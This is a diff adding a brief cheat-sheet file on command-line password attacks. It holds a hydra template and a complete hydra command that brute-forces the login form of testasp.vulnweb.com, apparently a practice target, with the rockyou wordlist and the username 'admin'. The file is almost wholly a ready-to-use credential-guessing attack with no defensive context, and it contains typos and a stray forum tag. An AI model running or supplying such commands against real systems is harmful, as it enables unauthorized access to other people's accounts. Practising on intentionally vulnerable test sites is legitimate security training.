@@ -1,0 +1,8 @@
+# Command Line human readable password attacks for fast on the fly procressing 
+
+
+hydra -l $users -P $passlist $target <service module> <post request parameters>[/code]
+
+Finally, based on information we have gathered, our commands ahould look something like this:
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^PASS^:S=logout" -vV -f
